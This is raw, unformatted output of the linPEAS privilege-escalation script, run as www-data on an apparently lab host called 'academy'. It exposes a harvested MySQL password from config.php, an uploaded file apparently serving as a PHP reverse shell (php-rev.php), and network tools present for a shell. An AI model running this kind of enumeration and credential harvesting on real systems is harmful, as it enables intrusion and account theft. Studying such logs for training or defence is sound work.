/usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 